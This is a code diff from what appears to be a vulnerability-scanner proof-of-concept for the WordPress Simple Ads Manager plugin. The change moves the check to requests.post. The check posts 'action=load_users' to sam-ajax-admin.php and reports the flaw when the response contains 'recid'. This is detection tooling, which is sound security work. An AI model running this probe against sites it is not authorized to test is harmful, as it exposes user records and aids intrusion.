@@ -36,9 +36,8 @@ class Poc(ABPoc):
             payload = '/wp-content/plugins/simple-ads-manager/sam-ajax-admin.php'
             url = arg + payload
             post_data = 'action=load_users'
-            code, head,res, _, _ = hh.http('-d %s %s' % (post_data,url))
-                       
-            if code == 200 and 'recid' in res :
+            req = requests.post(url, data=post_data)
+            if req.status_code == 200 and 'recid' in req.text :
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target,name=self.vuln.name))
 
         except Exception, e:
